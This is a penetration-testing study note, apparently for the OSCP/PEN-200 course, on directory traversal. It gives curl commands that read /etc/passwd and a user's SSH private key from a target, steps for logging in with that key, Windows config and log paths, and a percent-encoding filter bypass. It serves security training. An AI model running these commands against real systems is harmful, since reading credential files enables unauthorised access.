# Directory Traversal

> **PEN-200 Chapter 9.** Directory Traversal (path traversal) is primarily a **file-read** vulnerability: use attacker-controlled file/path parameters to access files outside the web root. Do not confuse it with File Inclusion, where an included executable file may run as application code.

## Identify candidate parameters

Look closely at links and parameters whose values are filenames or paths:

```text
/index.php?page=admin.php
/login.php?language=en.html
```

Useful clues:

- Hover links, visit all reachable pages, and inspect source.
- A parameter such as `page=admin.php` or `language=en.html` is a strong traversal/LFI candidate.
- Note application subdirectories (`/cms/`, `/meteor/`, etc.) and the server-side language (`.php`, `.asp`, `.jsp`, ...).
- After finding a candidate, move testing to Burp Repeater or `curl` rather than relying only on browser rendering.

## Linux — basic traversal

```bash
# Relative traversal
curl 'http://<TARGET>/index.php?page=../../../../etc/passwd'

# If current server-side directory depth is unknown, over-traverse.
curl 'http://<TARGET>/index.php?page=../../../../../../../../../../etc/passwd'
```

Extra `../` sequences generally do not hurt after the filesystem root `/` has been reached.

### OSCP follow-up chain

```text
/etc/passwd
   ↓
identify usernames + home directories
   ↓
/home/<USER>/.ssh/id_rsa
   ↓
save key → chmod 400 → SSH
```

```bash
curl 'http://<TARGET>/index.php?page=../../../../../../home/<USER>/.ssh/id_rsa' -o id_rsa
chmod 400 id_rsa
ssh -i id_rsa <USER>@<TARGET>
# Nonstandard port:
ssh -i id_rsa -p <PORT> <USER>@<TARGET>
```

Also look for application configuration files, credentials, logs, keys, and source files that the web-server account can read.

## Windows traversal

Try **both** URL/path styles because Windows applications may handle them differently:

```text
../../../../Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
```

Useful Windows/IIS files:

```text
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\
```

Windows exploitation is often less direct than Linux, so fingerprint the web server/framework and research its configuration/log paths.

## URL / percent encoding bypass

If plain `../` is filtered, encode characters. PEN-200 demonstrates encoding the dots:

```text
../        → %2e%2e/
../../     → %2e%2e/%2e%2e/
```

Example:

```bash
curl 'http://<TARGET>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```

Reason: a filter may reject literal `../` but miss its encoded form, which the application/server later decodes.

## Directory Traversal vs LFI

```text
Directory Traversal
  └─ read file contents outside the intended directory

File Inclusion (LFI/RFI)
  └─ include a file in running application code
       ├─ non-executable file → contents may be displayed
       └─ executable file → may execute
```

If a PHP file **executes** instead of its source being displayed, treat the finding as File Inclusion and test LFI/RFI techniques.

Related: [[LFI-Local File Inclusion|LFI — Local File Inclusion]] · [[File Upload Bypass|File Upload Bypass]]
